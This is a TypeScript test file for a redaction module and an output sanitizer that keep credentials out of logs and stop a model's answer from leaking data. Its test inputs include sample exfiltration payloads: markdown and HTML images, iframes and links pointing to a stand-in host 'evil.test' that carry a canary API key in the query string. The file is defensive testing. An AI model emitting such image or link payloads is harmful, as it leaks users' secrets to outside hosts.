// Phase 21A (WS=agentweb): credentials never reach a model or a log, and a
// model's answer cannot carry data out through an image or a link.
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { Redactor, sanitizeModelOutput } from "../redact";
import { TaintLedger } from "../taint";

describe("Redactor", () => {
  const r = new Redactor(["hunter2-saved-password", "4111 1111 1111 1111"]);
  it("removes known secrets from text, however they are encoded", () => {
    assert.equal(r.text("pw=hunter2-saved-password&x=1"), "pw=[redacted]&x=1");
    assert.equal(r.text(`q=${encodeURIComponent("hunter2-saved-password")}`), "q=[redacted]");
    assert.equal(r.text(Buffer.from("hunter2-saved-password").toString("base64")), "[redacted]");
  });
  it("removes card numbers that pass the Luhn check, with or without spaces and dashes", () => {
    assert.equal(r.text("card 4242-4242-4242-4242 ok"), "card [redacted] ok");
    assert.equal(r.text("card 5555555555554444"), "card [redacted]");
  });
  it("leaves digit runs that are not card numbers alone", () => {
    assert.equal(r.text("order 1234567890123456"), "order 1234567890123456");
    assert.equal(r.text("call 020 7946 0958"), "call 020 7946 0958");
  });
  it("removes password and card fields from form-encoded and JSON text by name", () => {
    assert.equal(r.text("user=ann&password=abc123&x=1"), "user=ann&password=[redacted]&x=1");
    assert.equal(r.text(`{"cvv":"123","user":"ann"}`), `{"cvv":"[redacted]","user":"ann"}`);
  });
  it("cleans nested objects without changing their shape", () => {
    assert.deepEqual(r.deep({ a: ["hunter2-saved-password"], b: { password: "x", n: 3 } }), { a: ["[redacted]"], b: { password: "[redacted]", n: 3 } });
  });
});

describe("sanitizeModelOutput", () => {
  const ledger = new TaintLedger();
  ledger.registerSecret("sk-live-CANARY-7731a9");
  const opts = { allowedOrigins: new Set(["http://127.0.0.1:1"]), ledger };
  it("removes a markdown image to an address the task did not allow", () => {
    assert.equal(sanitizeModelOutput("Hours: 9-5\n\n![v](https://evil.test/p.png?d=sk-live-CANARY-7731a9)", opts), "Hours: 9-5\n\n[image removed]");
  });
  it("removes any image from another origin, secret or not (rendering it is a request)", () => {
    assert.equal(sanitizeModelOutput("![x](https://cdn.other.test/a.png)", opts), "[image removed]");
  });
  it("keeps an image from an allowed origin", () => {
    assert.equal(sanitizeModelOutput("![x](http://127.0.0.1:1/ok.png)", opts), "![x](http://127.0.0.1:1/ok.png)");
  });
  it("removes html images, frames and scripts", () => {
    assert.equal(sanitizeModelOutput(`a <img src="https://evil.test/x"> b`, opts), "a [image removed] b");
    assert.equal(sanitizeModelOutput(`<iframe src="https://evil.test"></iframe>x<script>1</script>`, opts), "x");
  });
  it("removes reference-style images and their definitions", () => {
    assert.equal(sanitizeModelOutput("![a][1]\n\n[1]: https://evil.test/i", opts), "[image removed]");
  });
  it("keeps ordinary links but strips a link that carries a secret", () => {
    assert.equal(sanitizeModelOutput("[docs](https://docs.test/a)", opts), "[docs](https://docs.test/a)");
    assert.equal(sanitizeModelOutput("[docs](https://x.test/?t=sk-live-CANARY-7731a9)", opts), "docs (link removed)");
  });
  it("replaces a bare address that carries a secret", () => {
    assert.equal(sanitizeModelOutput("see https://x.test/?t=c2stbGl2ZS1DQU5BUlktNzczMWE5 now", { ...opts, ledger: (() => { const l = new TaintLedger(); l.registerSecret("sk-live-CANARY-7731a9"); return l; })() }), "see [address removed] now");
  });
  it("leaves plain text alone", () => {
    assert.equal(sanitizeModelOutput("The hours are 9:00–17:00.", opts), "The hours are 9:00–17:00.");
  });
});
